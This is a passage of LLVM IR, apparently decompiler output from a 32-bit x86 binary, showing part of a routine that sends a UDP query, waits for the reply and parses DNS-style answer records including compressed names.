  %v3_804f431 = call i32 @function_8051d30(i32 %v2_804f429, i32 16)
  store i32 %v3_804f431, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_804f479 = load i32, i32* @edi, align 4
  %v1_804f479 = add i32 %v0_804f479, 1
  %v2_804f479 = inttoptr i32 %v1_804f479 to i16*
  store i16 256, i16* %v2_804f479, align 2
  %v0_804f482 = load i32, i32* @ebx, align 4
  %v1_804f482 = add i32 %v0_804f482, 2
  %v2_804f482 = inttoptr i32 %v1_804f482 to i16*
  store i16 256, i16* %v2_804f482, align 2
  %v0_804f488 = load i32, i32* %ebp.global-to-local, align 4
  %v10_804f488 = icmp eq i32 %v0_804f488, -1
  br i1 %v10_804f488, label %dec_label_pc_804f49c.preheader, label %dec_label_pc_804f490

dec_label_pc_804f490.loopexit:                    ; preds = %dec_label_pc_804f5b5
  %v0_804f493.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f490

dec_label_pc_804f490:                             ; preds = %dec_label_pc_804f490.loopexit, %dec_label_pc_804f3aa
  %v0_804f493 = phi i32 [ %v0_804f493.pre, %dec_label_pc_804f490.loopexit ], [ %v0_804f488, %dec_label_pc_804f3aa ]
  %v0_804f490 = load i32, i32* @esp, align 4
  %v2_804f493 = add i32 %v0_804f490, -16
  %v3_804f493 = inttoptr i32 %v2_804f493 to i32*
  store i32 %v0_804f493, i32* %v3_804f493, align 4
  %v1_804f494 = call i32 @function_8052241(i32 1)
  store i32 %v1_804f494, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f49c.preheader

dec_label_pc_804f49c.preheader:                   ; preds = %dec_label_pc_804f490, %dec_label_pc_804f3aa
  br label %dec_label_pc_804f49c

dec_label_pc_804f49c:                             ; preds = %dec_label_pc_804f49c.preheader, %dec_label_pc_804f5b5
  %v0_804f49c = load i32, i32* @ebx, align 4
  %v1_804f49c = load i32, i32* @esp, align 4
  %v2_804f49c = add i32 %v1_804f49c, -4
  %v3_804f49c = inttoptr i32 %v2_804f49c to i32*
  store i32 %v0_804f49c, i32* %v3_804f49c, align 4
  %v1_804f49d = add i32 %v1_804f49c, -8
  %v2_804f49d = inttoptr i32 %v1_804f49d to i32*
  store i32 0, i32* %v2_804f49d, align 4
  %v1_804f49f = add i32 %v1_804f49c, -12
  %v2_804f49f = inttoptr i32 %v1_804f49f to i32*
  store i32 2, i32* %v2_804f49f, align 4
  %v1_804f4a1 = add i32 %v1_804f49c, -16
  %v2_804f4a1 = inttoptr i32 %v1_804f4a1 to i32*
  store i32 2, i32* %v2_804f4a1, align 4
  %v3_804f4a3 = call i32 @function_8052a35(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804f4a3, i32* %eax.global-to-local, align 4
  %v0_804f4a8 = load i32, i32* @esp, align 4
  store i32 %v3_804f4a3, i32* @ebp, align 4
  %v10_804f4ad = icmp eq i32 %v3_804f4a3, -1
  br i1 %v10_804f4ad, label %dec_label_pc_804f5d0, label %dec_label_pc_804f4b6

dec_label_pc_804f4b6:                             ; preds = %dec_label_pc_804f49c
  %v0_804f4b6 = load i32, i32* @ecx, align 4
  %v2_804f4b6 = add i32 %v0_804f4a8, 12
  %v3_804f4b6 = inttoptr i32 %v2_804f4b6 to i32*
  store i32 %v0_804f4b6, i32* %v3_804f4b6, align 4
  %v1_804f4b7 = add i32 %v0_804f4a8, 8
  %v2_804f4b7 = inttoptr i32 %v1_804f4b7 to i32*
  store i32 16, i32* %v2_804f4b7, align 4
  %v1_804f4b9 = add i32 %v0_804f4a8, 4272
  store i32 %v1_804f4b9, i32* @edi, align 4
  %v2_804f4c0 = add i32 %v0_804f4a8, 4
  %v3_804f4c0 = inttoptr i32 %v2_804f4c0 to i32*
  store i32 %v1_804f4b9, i32* %v3_804f4c0, align 4
  %v3_804f4c1 = inttoptr i32 %v0_804f4a8 to i32*
  store i32 %v3_804f4a3, i32* %v3_804f4c1, align 4
  %v3_804f4c2 = call i32 @function_805285a(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f4c7 = load i32, i32* @esp, align 4
  %v1_804f4ca = add i32 %v3_804f4c2, 1
  %v8_804f4ca = icmp eq i32 %v1_804f4ca, 0
  store i32 %v1_804f4ca, i32* %eax.global-to-local, align 4
  br i1 %v8_804f4ca, label %dec_label_pc_804f5d0, label %dec_label_pc_804f4d1

dec_label_pc_804f4d1:                             ; preds = %dec_label_pc_804f4b6
  %v1_804f4d1 = add i32 %v0_804f4c7, 12
  %v2_804f4d1 = inttoptr i32 %v1_804f4d1 to i32*
  store i32 16384, i32* %v2_804f4d1, align 4
  %v1_804f4d6 = add i32 %v0_804f4c7, 20
  %v2_804f4d6 = inttoptr i32 %v1_804f4d6 to i32*
  %v3_804f4d6 = load i32, i32* %v2_804f4d6, align 4
  store i32 %v3_804f4d6, i32* %edx.global-to-local, align 4
  %v2_804f4da = add i32 %v0_804f4c7, 8
  %v3_804f4da = inttoptr i32 %v2_804f4da to i32*
  store i32 %v3_804f4d6, i32* %v3_804f4da, align 4
  %v1_804f4db = add i32 %v0_804f4c7, 2096
  store i32 %v1_804f4db, i32* %eax.global-to-local, align 4
  %v2_804f4e2 = add i32 %v0_804f4c7, 4
  %v3_804f4e2 = inttoptr i32 %v2_804f4e2 to i32*
  store i32 %v1_804f4db, i32* %v3_804f4e2, align 4
  %v0_804f4e3 = load i32, i32* @ebp, align 4
  %v3_804f4e3 = inttoptr i32 %v0_804f4c7 to i32*
  store i32 %v0_804f4e3, i32* %v3_804f4e3, align 4
  %v0_804f4e4 = call i32 @function_8052984()
  %v0_804f4e9 = load i32, i32* @esp, align 4
  %v1_804f4ec = add i32 %v0_804f4e4, 1
  %v8_804f4ec = icmp eq i32 %v1_804f4ec, 0
  store i32 %v1_804f4ec, i32* %eax.global-to-local, align 4
  br i1 %v8_804f4ec, label %dec_label_pc_804f5d0, label %dec_label_pc_804f4f3

dec_label_pc_804f4f3:                             ; preds = %dec_label_pc_804f4d1
  %v2_804f4f3 = add i32 %v0_804f4e9, 12
  %v3_804f4f3 = inttoptr i32 %v2_804f4f3 to i32*
  store i32 %v1_804f4ec, i32* %v3_804f4f3, align 4
  %v1_804f4f4 = add i32 %v0_804f4e9, 8
  %v2_804f4f4 = inttoptr i32 %v1_804f4f4 to i32*
  store i32 0, i32* %v2_804f4f4, align 4
  %v0_804f4f6 = load i32, i32* @ebp, align 4
  %v2_804f4f6 = add i32 %v0_804f4e9, 4
  %v3_804f4f6 = inttoptr i32 %v2_804f4f6 to i32*
  store i32 %v0_804f4f6, i32* %v3_804f4f6, align 4
  %v2_804f4f7 = inttoptr i32 %v0_804f4e9 to i32*
  store i32 3, i32* %v2_804f4f7, align 4
  %v3_804f4f9 = call i32 @function_805217d(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f4fe = load i32, i32* @esp, align 4
  %v12_804f501 = or i32 %v3_804f4f9, 2048
  store i32 %v12_804f501, i32* %eax.global-to-local, align 4
  %v2_804f504 = add i32 %v0_804f4fe, 8
  %v3_804f504 = inttoptr i32 %v2_804f504 to i32*
  store i32 %v12_804f501, i32* %v3_804f504, align 4
  %v0_804f505 = load i32, i32* @ebp, align 4
  %v2_804f505 = add i32 %v0_804f4fe, 4
  %v3_804f505 = inttoptr i32 %v2_804f505 to i32*
  store i32 %v0_804f505, i32* %v3_804f505, align 4
  %v2_804f506 = inttoptr i32 %v0_804f4fe to i32*
  store i32 4, i32* %v2_804f506, align 4
  %v3_804f508 = call i32 @function_805217d(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f50d = load i32, i32* @esp, align 4
  %v1_804f50d = add i32 %v0_804f50d, 4144
  store i32 %v1_804f50d, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804f51b = inttoptr i32 %v1_804f50d to i8*
  store i32 %v1_804f50d, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804f51e = call i8* @_memset(i8* %v1_804f51b, i32 0, i32 32)
  %v6_804f51e = ptrtoint i8* %v5_804f51e to i32
  store i32 %v6_804f51e, i32* %ecx.global-to-local, align 4
  %v0_804f520 = load i32, i32* @ebp, align 4
  %v2_804f524 = udiv i32 %v0_804f520, 32
  store i32 %v2_804f524, i32* @esi, align 4
  %v1_804f527 = urem i32 %v0_804f520, 32
  store i32 %v1_804f527, i32* @ebx, align 4
  %v0_804f52a = load i32, i32* @esp, align 4
  %v2_804f52a = mul nuw nsw i32 %v2_804f524, 4
  %v3_804f52a = add nuw nsw i32 %v2_804f52a, 4144
  %v4_804f52a = add i32 %v3_804f52a, %v0_804f52a
  %v5_804f52a = inttoptr i32 %v4_804f52a to i32*
  %v6_804f52a = load i32, i32* %v5_804f52a, align 4
  %v9_804f52a = shl i32 1, %v1_804f527
  %v12_804f52a = or i32 %v6_804f52a, %v9_804f52a
  store i32 %v12_804f52a, i32* %v5_804f52a, align 4
  %v0_804f532 = load i32, i32* @esp, align 4
  %v1_804f532 = add i32 %v0_804f532, 4288
  %v2_804f532 = inttoptr i32 %v1_804f532 to i32*
  store i32 5, i32* %v2_804f532, align 4
  %v0_804f53d = load i32, i32* @esp, align 4
  %v1_804f53d = add i32 %v0_804f53d, 4292
  %v2_804f53d = inttoptr i32 %v1_804f53d to i32*
  store i32 0, i32* %v2_804f53d, align 4
  %v0_804f548 = load i32, i32* @esp, align 4
  %v1_804f548 = inttoptr i32 %v0_804f548 to i32*
  %v1_804f549 = add i32 %v0_804f548, 4288
  store i32 %v1_804f549, i32* %v1_804f548, align 4
  %v0_804f551 = load i32, i32* @ebp, align 4
  %v1_804f551 = add i32 %v0_804f551, 1
  store i32 %v1_804f551, i32* %eax.global-to-local, align 4
  %v1_804f554 = add i32 %v0_804f548, -4
  %v2_804f554 = inttoptr i32 %v1_804f554 to i32*
  store i32 0, i32* %v2_804f554, align 4
  %v1_804f556 = add i32 %v0_804f548, -8
  %v2_804f556 = inttoptr i32 %v1_804f556 to i32*
  store i32 0, i32* %v2_804f556, align 4
  %v0_804f558 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f558 = add i32 %v0_804f548, -12
  %v3_804f558 = inttoptr i32 %v2_804f558 to i32*
  store i32 %v0_804f558, i32* %v3_804f558, align 4
  %v0_804f559 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f559 = add i32 %v0_804f548, -16
  %v3_804f559 = inttoptr i32 %v2_804f559 to i32*
  store i32 %v0_804f559, i32* %v3_804f559, align 4
  %v0_804f55a = call i32 @function_8052448()
  store i32 %v0_804f55a, i32* %eax.global-to-local, align 4
  %v0_804f55f = load i32, i32* @esp, align 4
  %v1_804f55f = add i32 %v0_804f55f, 32
  %v10_804f562 = icmp eq i32 %v0_804f55a, -1
  br i1 %v10_804f562, label %dec_label_pc_804f5e4, label %dec_label_pc_804f567

dec_label_pc_804f567:                             ; preds = %dec_label_pc_804f4f3
  %v1_804f567 = icmp eq i32 %v0_804f55a, 0
  br i1 %v1_804f567, label %dec_label_pc_804f5ae, label %dec_label_pc_804f56b

dec_label_pc_804f56b:                             ; preds = %dec_label_pc_804f567
  %v1_804f56b = load i32, i32* @esi, align 4
  %v2_804f56b = mul i32 %v1_804f56b, 4
  %v3_804f56b = add i32 %v0_804f55f, 4160
  %v4_804f56b = add i32 %v3_804f56b, %v2_804f56b
  %v5_804f56b = inttoptr i32 %v4_804f56b to i32*
  %v6_804f56b = load i32, i32* %v5_804f56b, align 4
  %v7_804f56b = load i32, i32* @ebx, align 4
  %v8_804f56b = urem i32 %v7_804f56b, 32
  %v9_804f56b = shl i32 1, %v8_804f56b
  %v10_804f56b = and i32 %v9_804f56b, %v6_804f56b
  %v11_804f56b = icmp ne i32 %v10_804f56b, 0
  %v1_804f573 = zext i1 %v11_804f56b to i32
  %v3_804f573 = and i32 %v0_804f55a, -256
  %v4_804f573 = or i32 %v1_804f573, %v3_804f573
  store i32 %v4_804f573, i32* %eax.global-to-local, align 4
  %v4_804f576 = icmp eq i1 %v11_804f56b, false
  br i1 %v4_804f576, label %dec_label_pc_804f5e4, label %dec_label_pc_804f57a

dec_label_pc_804f57a:                             ; preds = %dec_label_pc_804f56b
  %v2_804f57a = add i32 %v0_804f55f, 28
  %v3_804f57a = inttoptr i32 %v2_804f57a to i32*
  store i32 %v4_804f573, i32* %v3_804f57a, align 4
  %v0_804f57b = load i32, i32* %eax.global-to-local, align 4
  %v2_804f57b = add i32 %v0_804f55f, 24
  %v3_804f57b = inttoptr i32 %v2_804f57b to i32*
  store i32 %v0_804f57b, i32* %v3_804f57b, align 4
  %v1_804f57c = add i32 %v0_804f55f, 20
  %v2_804f57c = inttoptr i32 %v1_804f57c to i32*
  store i32 0, i32* %v2_804f57c, align 4
  %v1_804f57e = add i32 %v0_804f55f, 16
  %v2_804f57e = inttoptr i32 %v1_804f57e to i32*
  store i32 0, i32* %v2_804f57e, align 4
  %v1_804f580 = add i32 %v0_804f55f, 12
  %v2_804f580 = inttoptr i32 %v1_804f580 to i32*
  store i32 16384, i32* %v2_804f580, align 4
  %v1_804f585 = add i32 %v0_804f55f, 8
  %v2_804f585 = inttoptr i32 %v1_804f585 to i32*
  store i32 2048, i32* %v2_804f585, align 4
  %v1_804f58a = add i32 %v0_804f55f, 64
  store i32 %v1_804f58a, i32* %eax.global-to-local, align 4
  %v2_804f58e = add i32 %v0_804f55f, 4
  %v3_804f58e = inttoptr i32 %v2_804f58e to i32*
  store i32 %v1_804f58a, i32* %v3_804f58e, align 4
  %v0_804f58f = load i32, i32* @ebp, align 4
  %v3_804f58f = inttoptr i32 %v0_804f55f to i32*
  store i32 %v0_804f58f, i32* %v3_804f58f, align 4
  %v0_804f590 = call i32 @function_8052941()
  store i32 %v0_804f590, i32* %eax.global-to-local, align 4
  %v0_804f595 = load i32, i32* @esp, align 4
  store i32 %v0_804f590, i32* @ebx, align 4
  %v1_804f59a = add i32 %v0_804f595, 56
  %v2_804f59a = inttoptr i32 %v1_804f59a to i32*
  %v3_804f59a = load i32, i32* %v2_804f59a, align 4
  store i32 %v3_804f59a, i32* %eax.global-to-local, align 4
  %v2_804f59e = add i32 %v0_804f595, 16
  %v3_804f59e = inttoptr i32 %v2_804f59e to i32*
  store i32 %v3_804f59a, i32* %v3_804f59e, align 4
  %v2_804f59f = call i32 @function_8051ca0(i8* inttoptr (i32 1 to i8*))
  %v1_804f5a4 = add i32 %v2_804f59f, 17
  store i32 %v1_804f5a4, i32* %eax.global-to-local, align 4
  %v0_804f5a7 = load i32, i32* @esp, align 4
  %v1_804f5a7 = add i32 %v0_804f5a7, 16
  %v0_804f5aa = load i32, i32* @ebx, align 4
  %v7_804f5aa = icmp ult i32 %v0_804f5aa, %v1_804f5a4
  %v1_804f5ac = icmp eq i1 %v7_804f5aa, false
  br i1 %v1_804f5ac, label %dec_label_pc_804f60a, label %dec_label_pc_804f5ae

dec_label_pc_804f5ae:                             ; preds = %dec_label_pc_804f636, %dec_label_pc_804f60a, %dec_label_pc_804f57a, %dec_label_pc_804f567
  %v0_804f5ae = phi i32 [ %v1_804f623, %dec_label_pc_804f636 ], [ %v1_804f623, %dec_label_pc_804f60a ], [ %v1_804f5a7, %dec_label_pc_804f57a ], [ %v1_804f55f, %dec_label_pc_804f567 ]
  %v1_804f5ae = add i32 %v0_804f5ae, 8
  %v2_804f5ae = inttoptr i32 %v1_804f5ae to i32*
  %v3_804f5ae = load i32, i32* %v2_804f5ae, align 4
  %v12_804f5ae = icmp eq i32 %v3_804f5ae, 5
  br i1 %v12_804f5ae, label %dec_label_pc_804f5e4, label %dec_label_pc_804f5b5

dec_label_pc_804f5b5:                             ; preds = %dec_label_pc_804f5d0, %dec_label_pc_804f5ae
  %v3_804f5b5 = phi i32 [ %v3_804f5dd, %dec_label_pc_804f5d0 ], [ %v3_804f5ae, %dec_label_pc_804f5ae ]
  %v1_804f5bd = phi i32 [ %v1_804f5da, %dec_label_pc_804f5d0 ], [ %v0_804f5ae, %dec_label_pc_804f5ae ]
  %v1_804f5b5 = add i32 %v1_804f5bd, 8
  %v2_804f5b5 = inttoptr i32 %v1_804f5b5 to i32*
  %v1_804f5b9 = add i32 %v3_804f5b5, 1
  store i32 %v1_804f5b9, i32* @edi, align 4
  %v0_804f5ba = load i32, i32* @ebp, align 4
  %v10_804f5ba = icmp eq i32 %v0_804f5ba, -1
  store i32 %v1_804f5b9, i32* %v2_804f5b5, align 4
  %v1_804f5c1 = icmp eq i1 %v10_804f5ba, false
  br i1 %v1_804f5c1, label %dec_label_pc_804f490.loopexit, label %dec_label_pc_804f49c

dec_label_pc_804f5d0:                             ; preds = %dec_label_pc_804f4d1, %dec_label_pc_804f4b6, %dec_label_pc_804f49c
  %v0_804f5d0.in = phi i32 [ %v0_804f4e9, %dec_label_pc_804f4d1 ], [ %v0_804f4c7, %dec_label_pc_804f4b6 ], [ %v0_804f4a8, %dec_label_pc_804f49c ]
  %v2_804f5d3 = inttoptr i32 %v0_804f5d0.in to i32*
  store i32 1, i32* %v2_804f5d3, align 4
  %v1_804f5d5 = call i32 @function_8053df0(i32 1)
  store i32 %v1_804f5d5, i32* %eax.global-to-local, align 4
  %v0_804f5da = load i32, i32* @esp, align 4
  %v1_804f5da = add i32 %v0_804f5da, 16
  %v1_804f5dd = add i32 %v0_804f5da, 24
  %v2_804f5dd = inttoptr i32 %v1_804f5dd to i32*
  %v3_804f5dd = load i32, i32* %v2_804f5dd, align 4
  %v12_804f5dd = icmp eq i32 %v3_804f5dd, 5
  %v1_804f5e2 = icmp eq i1 %v12_804f5dd, false
  br i1 %v1_804f5e2, label %dec_label_pc_804f5b5, label %dec_label_pc_804f5e4

dec_label_pc_804f5e4:                             ; preds = %dec_label_pc_804f5d0, %dec_label_pc_804f5ae, %dec_label_pc_804f56b, %dec_label_pc_804f4f3, %dec_label_pc_804f644, %dec_label_pc_804f64d.backedge
  %v0_804f5e4 = phi i32 [ %v0_804f652122, %dec_label_pc_804f644 ], [ %v0_804f652, %dec_label_pc_804f64d.backedge ], [ %v1_804f5da, %dec_label_pc_804f5d0 ], [ %v0_804f5ae, %dec_label_pc_804f5ae ], [ %v1_804f55f, %dec_label_pc_804f56b ], [ %v1_804f55f, %dec_label_pc_804f4f3 ]
  %v0_804f5e7 = load i32, i32* @ebp, align 4
  %v2_804f5e7 = add i32 %v0_804f5e4, -16
  %v3_804f5e7 = inttoptr i32 %v2_804f5e7 to i32*
  store i32 %v0_804f5e7, i32* %v3_804f5e7, align 4
  %v1_804f5e8 = call i32 @function_8052241(i32 1)
  store i32 %v1_804f5e8, i32* %eax.global-to-local, align 4
  %v0_804f5ed = load i32, i32* @esp, align 4
  %v1_804f5ed = add i32 %v0_804f5ed, 16
  %v1_804f5f0 = inttoptr i32 %v1_804f5ed to i32*
  %v2_804f5f0 = load i32, i32* %v1_804f5f0, align 4
  store i32 %v2_804f5f0, i32* %edx.global-to-local, align 4
  %v1_804f5f3 = inttoptr i32 %v2_804f5f0 to i8*
  %v2_804f5f3 = load i8, i8* %v1_804f5f3, align 1
  %v3_804f5f3 = icmp eq i8 %v2_804f5f3, 0
  br i1 %v3_804f5f3, label %dec_label_pc_804f6f3, label %dec_label_pc_804f5fc

dec_label_pc_804f5fc:                             ; preds = %dec_label_pc_804f5e4
  %v2_804f5fc = load i32, i32* %v1_804f5f0, align 4
  store i32 %v2_804f5fc, i32* %eax.global-to-local, align 4
  %v1_804f5ff = add i32 %v0_804f5ed, 4300
  %v1_804f605 = inttoptr i32 %v1_804f5ff to i32*
  %v2_804f605 = load i32, i32* %v1_804f605, align 4
  store i32 %v2_804f605, i32* @ebx, align 4
  %v3_804f606 = add i32 %v0_804f5ed, 4308
  %v1_804f607 = inttoptr i32 %v3_804f606 to i32*
  %v2_804f607 = load i32, i32* %v1_804f607, align 4
  store i32 %v2_804f607, i32* @edi, align 4
  %v3_804f607 = add i32 %v0_804f5ed, 4312
  %v1_804f608 = inttoptr i32 %v3_804f607 to i32*
  %v2_804f608 = load i32, i32* %v1_804f608, align 4
  store i32 %v2_804f608, i32* @ebp, align 4
  ret i32 %v2_804f5fc

dec_label_pc_804f60a:                             ; preds = %dec_label_pc_804f57a
  %v1_804f60a = add i32 %v0_804f5a7, 60
  store i32 %v1_804f60a, i32* %edx.global-to-local, align 4
  %v2_804f60e = add i32 %v0_804f5a7, 40
  %v3_804f60e = inttoptr i32 %v2_804f60e to i32*
  store i32 %v1_804f60a, i32* %v3_804f60e, align 4
  %v0_804f612 = load i32, i32* @esp, align 4
  %v1_804f615 = add i32 %v0_804f612, 44
  store i32 %v1_804f615, i32* %ecx.global-to-local, align 4
  %v2_804f619 = add i32 %v0_804f612, -16
  %v3_804f619 = inttoptr i32 %v2_804f619 to i32*
  store i32 %v1_804f615, i32* %v3_804f619, align 4
  %v2_804f61a = call i32 @function_8051ca0(i8* inttoptr (i32 1 to i8*))
  store i32 %v2_804f61a, i32* %eax.global-to-local, align 4
  %v0_804f61f = load i32, i32* @esp, align 4
  %v2_804f61f = add i32 %v2_804f61a, 65
  %v3_804f61f = add i32 %v2_804f61f, %v0_804f61f
  store i32 %v3_804f61f, i32* %ecx.global-to-local, align 4
  %v1_804f623 = add i32 %v0_804f61f, 16
  %v1_804f626 = add i32 %v0_804f61f, 30
  %v2_804f626 = inttoptr i32 %v1_804f626 to i16*
  %v3_804f626 = load i16, i16* %v2_804f626, align 2
  %v4_804f626 = zext i16 %v3_804f626 to i32
  %v7_804f626 = and i32 %v1_804f50d, -65536
  %v8_804f626 = or i32 %v4_804f626, %v7_804f626
  store i32 %v8_804f626, i32* @edi, align 4
  %v3_804f62b = add i32 %v0_804f61f, 48
  %v4_804f62b = inttoptr i32 %v3_804f62b to i16*
  %v5_804f62b = load i16, i16* %v4_804f62b, align 2
  %v16_804f62b = icmp eq i16 %v3_804f626, %v5_804f62b
  %v1_804f630 = icmp eq i1 %v16_804f62b, false
  br i1 %v1_804f630, label %dec_label_pc_804f5ae, label %dec_label_pc_804f636

dec_label_pc_804f636:                             ; preds = %dec_label_pc_804f60a
  %v1_804f636 = add i32 %v0_804f61f, 54
  %v2_804f636 = inttoptr i32 %v1_804f636 to i16*
  %v3_804f636 = load i16, i16* %v2_804f636, align 2
  %v4_804f636 = zext i16 %v3_804f636 to i32
  %v6_804f636 = and i32 %v2_804f61a, -65536
  %v7_804f636 = or i32 %v4_804f636, %v6_804f636
  store i32 %v7_804f636, i32* %eax.global-to-local, align 4
  %v4_804f63b = icmp eq i16 %v3_804f636, 0
  br i1 %v4_804f63b, label %dec_label_pc_804f5ae, label %dec_label_pc_804f644

dec_label_pc_804f644:                             ; preds = %dec_label_pc_804f636
  %v2_804f644 = call i16 @llvm.bswap.i16(i16 %v3_804f636)
  %v3_804f644 = zext i16 %v2_804f644 to i32
  %v6_804f644 = or i32 %v3_804f644, %v6_804f636
  store i32 %v6_804f644, i32* %eax.global-to-local, align 4
  %v3_804f648 = add i32 %v0_804f61f, 38
  %v4_804f648 = inttoptr i32 %v3_804f648 to i16*
  store i16 %v2_804f644, i16* %v4_804f648, align 2
  %v0_804f64d117 = load i32, i32* @esp, align 4
  %v1_804f64d118 = add i32 %v0_804f64d117, 22
  %v2_804f64d119 = inttoptr i32 %v1_804f64d118 to i16*
  %v3_804f64d120 = load i16, i16* %v2_804f64d119, align 2
  %v4_804f64d121 = add i16 %v3_804f64d120, -1
  store i16 %v4_804f64d121, i16* %v2_804f64d119, align 2
  %v0_804f652122 = load i32, i32* @esp, align 4
  %v1_804f652123 = add i32 %v0_804f652122, 22
  %v2_804f652124 = inttoptr i32 %v1_804f652123 to i16*
  %v3_804f652125 = load i16, i16* %v2_804f652124, align 2
  %v13_804f652126 = icmp eq i16 %v3_804f652125, -1
  br i1 %v13_804f652126, label %dec_label_pc_804f5e4, label %dec_label_pc_804f65a

dec_label_pc_804f65a:                             ; preds = %dec_label_pc_804f644, %dec_label_pc_804f64d.backedge
  %v0_804f652127 = phi i32 [ %v0_804f652, %dec_label_pc_804f64d.backedge ], [ %v0_804f652122, %dec_label_pc_804f644 ]
  %v0_804f65a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804f65a, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804f66311 = inttoptr i32 %v0_804f65a to i8*
  %v2_804f66312 = load i8, i8* %v1_804f66311, align 1
  %v3_804f66313 = zext i8 %v2_804f66312 to i32
  %v4_804f66314 = load i32, i32* %eax.global-to-local, align 4
  %v5_804f66315 = and i32 %v4_804f66314, -256
  %v6_804f66316 = or i32 %v5_804f66315, %v3_804f66313
  store i32 %v6_804f66316, i32* %eax.global-to-local, align 4
  %v4_804f66517 = icmp eq i8 %v2_804f66312, 0
  br i1 %v4_804f66517, label %dec_label_pc_804f69a, label %dec_label_pc_804f669.preheader.preheader

dec_label_pc_804f669.preheader.preheader:         ; preds = %dec_label_pc_804f65a
  %v1_804f68e = add i32 %v0_804f652127, 32
  br label %dec_label_pc_804f669.preheader

dec_label_pc_804f669.preheader:                   ; preds = %dec_label_pc_804f669.preheader.preheader, %dec_label_pc_804f72c
  %v0_804f730 = phi i32 [ %v3_804f730, %dec_label_pc_804f72c ], [ 1, %dec_label_pc_804f669.preheader.preheader ]
  %v0_804f72d43 = phi i32 [ %v0_804f72d, %dec_label_pc_804f72c ], [ 0, %dec_label_pc_804f669.preheader.preheader ]
  %v0_804f67639 = phi i32 [ %v1_804f72c, %dec_label_pc_804f72c ], [ %v0_804f65a, %dec_label_pc_804f669.preheader.preheader ]
  %v0_804f66937 = phi i32 [ %v6_804f663, %dec_label_pc_804f72c ], [ %v6_804f66316, %dec_label_pc_804f669.preheader.preheader ]
  br label %dec_label_pc_804f669

dec_label_pc_804f669:                             ; preds = %dec_label_pc_804f669.preheader, %dec_label_pc_804f671
  %v0_804f72d = phi i32 [ %v0_804f72d43, %dec_label_pc_804f669.preheader ], [ 1, %dec_label_pc_804f671 ]
  %v0_804f72c = phi i32 [ %v0_804f67639, %dec_label_pc_804f669.preheader ], [ %v2_804f692, %dec_label_pc_804f671 ]
  %v4_804f663 = phi i32 [ %v0_804f66937, %dec_label_pc_804f669.preheader ], [ %v6_804f694, %dec_label_pc_804f671 ]
  %v1_804f669 = trunc i32 %v4_804f663 to i8
  %tmp139 = icmp ult i8 %v1_804f669, -64
  br i1 %tmp139, label %dec_label_pc_804f72c, label %dec_label_pc_804f671

dec_label_pc_804f671:                             ; preds = %dec_label_pc_804f669
  %v1_804f671 = urem i32 %v4_804f663, 256
  store i32 %v1_804f671, i32* %eax.global-to-local, align 4
  %v1_804f676 = add i32 %v0_804f72c, 1
  %v2_804f676 = inttoptr i32 %v1_804f676 to i8*
  %v3_804f676 = load i8, i8* %v2_804f676, align 1
  %v4_804f676 = zext i8 %v3_804f676 to i32
  store i32 1, i32* @ebx, align 4
  %v2_804f684 = mul nuw nsw i32 %v1_804f671, 256
  %v2_804f687 = add nsw i32 %v2_804f684, -49152
  %v3_804f687 = or i32 %v4_804f676, %v2_804f687
  store i32 %v3_804f687, i32* %eax.global-to-local, align 4
  %v2_804f692 = add i32 %v1_804f68e, %v3_804f687
  store i32 %v2_804f692, i32* %edx.global-to-local, align 4
  %v1_804f694 = inttoptr i32 %v2_804f692 to i8*
  %v2_804f694 = load i8, i8* %v1_804f694, align 1
  %v3_804f694 = zext i8 %v2_804f694 to i32
  %v6_804f694 = or i32 %v3_804f694, %v2_804f687
  store i32 %v6_804f694, i32* %eax.global-to-local, align 4
  %v4_804f696 = icmp eq i8 %v2_804f694, 0
  %v1_804f698 = icmp eq i1 %v4_804f696, false
  br i1 %v1_804f698, label %dec_label_pc_804f669, label %dec_label_pc_804f69a

dec_label_pc_804f69a:                             ; preds = %dec_label_pc_804f72c, %dec_label_pc_804f671, %dec_label_pc_804f65a
  %v4_804f6b623 = phi i32 [ %v6_804f66316, %dec_label_pc_804f65a ], [ %v6_804f694, %dec_label_pc_804f671 ], [ %v6_804f663, %dec_label_pc_804f72c ]
  %v5_804f750 = phi i32 [ %v0_804f65a, %dec_label_pc_804f65a ], [ %v2_804f692, %dec_label_pc_804f671 ], [ %v1_804f72c, %dec_label_pc_804f72c ]
  %v1_804f69a = phi i32 [ 0, %dec_label_pc_804f65a ], [ 1, %dec_label_pc_804f671 ], [ %v0_804f72d, %dec_label_pc_804f72c ]
  %v0_804f69a = phi i32 [ 1, %dec_label_pc_804f65a ], [ %v0_804f730, %dec_label_pc_804f671 ], [ %v3_804f730, %dec_label_pc_804f72c ]
  %v2_804f69a = add i32 %v1_804f69a, %v0_804f65a
  %v2_804f69c = add i32 %v2_804f69a, %v0_804f69a
  store i32 %v2_804f69c, i32* @esi, align 4
  %v1_804f69f = inttoptr i32 %v2_804f69c to i16*
  %v2_804f69f = load i16, i16* %v1_804f69f, align 2
  %v8_804f69f = icmp eq i16 %v2_804f69f, 256
  %v1_804f6a4 = add i32 %v2_804f69c, 10
  store i32 %v1_804f6a4, i32* @edi, align 4
  br i1 %v8_804f69f, label %dec_label_pc_804f744, label %dec_label_pc_804f6ad

dec_label_pc_804f6ad:                             ; preds = %dec_label_pc_804f744, %dec_label_pc_804f69a
  store i32 %v1_804f6a4, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804f6b620 = inttoptr i32 %v1_804f6a4 to i8*
  %v2_804f6b621 = load i8, i8* %v1_804f6b620, align 1
  %v3_804f6b622 = zext i8 %v2_804f6b621 to i32
  %v5_804f6b624 = and i32 %v4_804f6b623, -256
